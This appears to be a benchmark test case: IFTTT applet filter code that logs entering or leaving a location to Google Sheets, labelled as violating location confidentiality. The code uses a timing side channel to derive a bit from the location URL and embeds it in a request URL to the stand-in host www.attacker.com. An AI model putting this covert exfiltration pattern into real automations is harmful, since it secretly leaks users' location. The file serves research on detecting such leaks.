//Maker: ktavangari
//Link2Applet:  https://ifttt.com/applets/133495p-log-how-much-time-you-spend-at-home-work-etc
//Title of Applet:  Log how much time you spend at home/work/etc. 
//Trigger service: Location 
//Action service: Google Sheets
//Policy/Presence:  Confidentiality of Location / YES

when = 'Location.enterOrExitRegionLocation.OccurredAt';
what = 'Location.enterOrExitRegionLocation.EnteredOrExited';
where = 'Location.enterOrExitRegionLocation.LocationMapUrl';

var res = "";
var stime = Date.now();
var a = lbl(1); 
if (where.charCodeAt(0) == 48) { a = lbl(10); while (a > 0) { a--; } }
else { a = lbl(0); while (a > 0) { a--; }  }
var etime = Date.now();
var b = etime-stime > 0 
if (b) { res += 0 }
else { res += 1 } 


attack = urll("www.attacker.com?" + res);


sink('GoogleSheets.appendToGoogleSpreadsheet', 'setFilename', 'Time at location');
sink('GoogleSheets.appendToGoogleSpreadsheet', 'setFormattedRow', what + ' ||| '+ when + ' ||| ' + attack);

